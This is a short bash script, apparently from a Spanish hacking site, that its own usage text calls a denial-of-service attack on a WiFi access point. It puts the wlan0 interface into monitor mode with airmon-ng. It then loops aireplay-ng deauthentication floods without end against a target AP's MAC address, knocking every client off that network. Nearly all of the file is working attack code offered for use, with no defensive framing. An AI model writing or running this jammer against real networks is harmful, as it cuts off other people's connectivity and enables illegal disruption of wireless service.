#!/bin/bash
#
#
cat << "INFO"
       _
      | |
      | | __ _ _ __ ___  _ __ ___   ___ _ __
  _   | |/ _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 | |__| | (_| | | | | | | | | | | |  __/ |
  \____/ \__,_|_| |_| |_|_| |_| |_|\___|_|   WIFI v1.0

            http://www.hackingyseguridad.com

INFO
if [ -z "$1" ]; then
        echo
        echo "Ataque de denegacion de servicio a Punto de acceso Wifi con jammer.sh"
        echo "Es necesario especificar la MAC Address 00:11:22:AA:BB.CC del AP a atacar"
        echo "Uso.: sh jammer.sh <MAC_AP_OBJETIVO>"
        echo
        exit 0
fi
echo
airmon-ng
airmon-ng start wlan0

while :;

do
        aireplay-ng --deauth 1000 -a $1 wlan0mon
done
airmon-ng stop wlan0mon
